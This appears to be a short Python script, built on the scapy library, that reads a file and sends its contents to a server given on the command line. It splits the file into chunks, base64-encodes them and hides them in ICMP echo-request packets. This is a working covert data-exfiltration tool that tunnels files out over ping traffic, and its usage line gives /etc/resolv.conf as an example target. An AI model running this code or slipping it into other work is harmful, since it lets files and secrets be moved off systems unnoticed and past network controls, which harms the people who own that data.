#!/usr/bin/python3
# icmp-textfile-transmit

# import modules
from scapy.all import *
import sys
import base64
from time import sleep

# read arguments
if len(sys.argv) < 4:
    print("usage: ex1.py SERVER_IP ./FILE BYTES")
    print("usage: ex1.py 127.0.0.1 /etc/resolv.conf 1024")
    raise SystemExit

server = sys.argv[1]
file = sys.argv[2]
bytes = int(sys.argv[3])
filename = os.path.basename((file))
print(server)
print(file)
print(filename)

# read file content 
with open(file, encoding='latin-1') as f:
    file_data = f.read()

# split file content
for i in range(0, len(file_data), bytes):
# concat string for encoding
    data = filename + "_" + str(i) + "_" + file_data[i:i+bytes]
# convert segment to base64
    data_bytes = data.encode('utf-8')
    base64_bytes = base64.b64encode(data_bytes)
    base64_data = base64_bytes.decode('utf-8')

# UNCOMMENT FOR DEBUG
    #print(data)
    #print(data_bytes)
    #print(base64_bytes)
    #print(base64_data[i:i+bytes])
    #print(payload)

# send file content

    send(IP(dst=server)/ICMP(type=8)/ (base64_data))
    #sleep(0.5)
